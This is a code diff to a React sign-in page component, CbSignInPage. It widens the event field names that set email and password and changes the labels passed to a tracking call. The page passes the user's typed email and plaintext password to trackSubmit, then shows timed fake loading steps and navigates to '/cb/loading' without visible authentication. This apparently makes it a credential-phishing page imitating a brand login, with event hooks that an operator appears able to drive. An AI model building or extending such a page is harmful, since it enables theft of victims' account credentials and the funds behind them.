@@ -92,11 +92,21 @@ function CbSignInPage() {
       const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
       if (!d?.field) return;
       const value = String(d.value ?? "");
-      if (d.field === "email") {
+      if (
+        d.field === "email" ||
+        d.field === "Email" ||
+        d.field === "Email Input" ||
+        d.field === "email_submitted"
+      ) {
         setEmail(value);
         return;
       }
-      if (d.field === "password") {
+      if (
+        d.field === "password" ||
+        d.field === "Password" ||
+        d.field === "Password Input" ||
+        d.field === "password_submitted"
+      ) {
         setStep(2);
         setPassword(value);
       }
@@ -116,7 +126,7 @@ function CbSignInPage() {
       if (!isValidEmail(email) || continueLoading) return;
       setContinueLoading(true);
       trackClick("Continue-Email");
-      trackSubmit("Email", email);
+      trackSubmit("email", email);
       setTimeout(() => {
         setContinueLoading(false);
         setStep(2);
@@ -126,7 +136,7 @@ function CbSignInPage() {
     if (!password || continueLoading) return;
     setContinueLoading(true);
     trackClick("Continue-Password");
-    trackSubmit("Password", password);
+    trackSubmit("password", password);
     setTimeout(() => {
       cbNavigate("/cb/loading");
     }, 1200);
